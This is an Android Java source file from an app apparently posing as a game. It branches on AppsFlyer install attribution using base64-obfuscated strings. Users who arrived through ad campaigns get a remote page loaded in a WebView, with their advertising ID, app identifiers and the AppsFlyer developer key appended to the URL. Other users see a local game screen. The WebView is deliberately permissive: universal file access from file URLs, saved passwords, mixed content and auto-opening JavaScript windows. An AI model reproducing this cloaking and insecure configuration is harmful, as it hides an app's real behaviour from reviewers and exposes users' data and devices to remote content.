package com.nneo.srta;

import android.content.Intent;
import android.util.Base64;
import android.util.Log;
import android.view.View;
import android.webkit.WebSettings;
import android.webkit.WebView;

import com.appsflyer.AppsFlyerConversionListener;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.Map;
import java.util.Objects;

public class WebClass extends NS {

    ParsLine parsLine = new ParsLine();
    public String statusAppsFlyer;
    public String paramsNnneoSrta;

    AppsFlyerConversionListener conversionListener = new AppsFlyerConversionListener() {
        @Override
        public void onConversionDataSuccess(Map<String, Object> conversionDataMap) {
            for (String attrName : conversionDataMap.keySet())
                Log.d(LOG, "Conversion attribute: " + attrName + " = " + conversionDataMap.get(attrName));
            statusAppsFlyer = Objects.requireNonNull(conversionDataMap.get(Decoder11("YWZfc3RhdHVz"))).toString();
            Log.i(LOG, "statusapps1: " + statusAppsFlyer);
            if (statusAppsFlyer.equals(Decoder11("Tm9uLW9yZ2FuaWM="))) {
                // Business logic for Organic conversion goes here.
                String statusCampaign = Objects.requireNonNull(conversionDataMap.get(Decoder11("Y2FtcGFpZ24="))).toString();
                paramsNnneoSrta = parsLine.ChangeLine(statusCampaign);
            } else {
                // Business logic for Non-organic conversion goes here.
            }
        }

        @Override
        public void onConversionDataFail(String s) {

        }

        @Override
        public void onAppOpenAttribution(Map<String, String> map) {

        }

        @Override
        public void onAttributionFailure(String s) {

        }
    };

    public void getWeb(WebView webView, String link) {
        webView.setVisibility(View.VISIBLE);
        webView.getSettings().setJavaScriptEnabled(true);
        webView.getSettings().setAppCacheEnabled(true);
        webView.getSettings().setDomStorageEnabled(true);
        webView.getSettings().setAllowContentAccess(true);
        webView.getSettings().setAllowFileAccess(true);
        webView.getSettings().setAppCacheEnabled(true);
        webView.getSettings().setAllowFileAccessFromFileURLs(true);
        webView.getSettings().setSaveFormData(true);
        webView.getSettings().setMixedContentMode(0);
        webView.getSettings().setSavePassword(true);
        webView.getSettings().setAllowContentAccess(true);
        webView.getSettings().setLoadsImagesAutomatically(true);
        webView.getSettings().setAllowUniversalAccessFromFileURLs(true);
        webView.getSettings().setDatabaseEnabled(true);
        webView.getSettings().setLoadWithOverviewMode(true);
        webView.getSettings().setUseWideViewPort(true);
        webView.getSettings().setJavaScriptCanOpenWindowsAutomatically(true);
        webView.getSettings().setDomStorageEnabled(true);
        webView.getSettings().setAllowFileAccess(true);
        webView.getSettings().setRenderPriority(WebSettings.RenderPriority.HIGH);
        webView.getSettings().setEnableSmoothTransition(true);
        webView.loadUrl(link);
    }

    public void oneSignal(NS NS) {
        com.onesignal.OneSignal.setLogLevel(com.onesignal.OneSignal.LOG_LEVEL.VERBOSE, com.onesignal.OneSignal.LOG_LEVEL.NONE);
        com.onesignal.OneSignal.initWithContext(NS);
        com.onesignal.OneSignal.setAppId(ONESIGNAL_APP_ID_NNEO_SRTA);
    }


    public void StartWebView(String link, String keyLink, WebView webView, String fbDataNnneoSrta, NS ns) {

        if (statusAppsFlyer.equals(Decoder11("Tm9uLW9yZ2FuaWM="))) {
            String load = (link + paramsNnneoSrta);
            Log.i(LOG, "non: " + load);
            getWeb(webView, load);

        } else if (fbDataNnneoSrta != null) {
            String load = (link + fbDataNnneoSrta);
            Log.i(LOG, "fb: " + load);
            getWeb(webView, load);
        } else {
            if (keyLink.equals(Decoder11("Tk8="))) {
                Intent intent = new Intent(ns.getApplicationContext(), GameActivity.class);
                ns.startActivity(intent);
            } else {
                paramsNnneoSrta = (keyLink + Decoder11("P2J1bmRsZT0=") + packageNameNnneoSrta +
                        Decoder11("JmFkX2lkPQ==") + NS.adIdNnneoSrta + Decoder11("JmFwcHNfaWQ9") +
                        NS.apps_idNnneoSrta + Decoder11("JmRldl9rZXk9") + AF_DEV_KEY_NNEO_SRTA);
                String load = link + paramsNnneoSrta;
                Log.i(LOG, "org: " + load);
                getWeb(webView, load);
                Log.i(LOG, "StartWebViewParams: " + paramsNnneoSrta);
            }
        }
    }
}
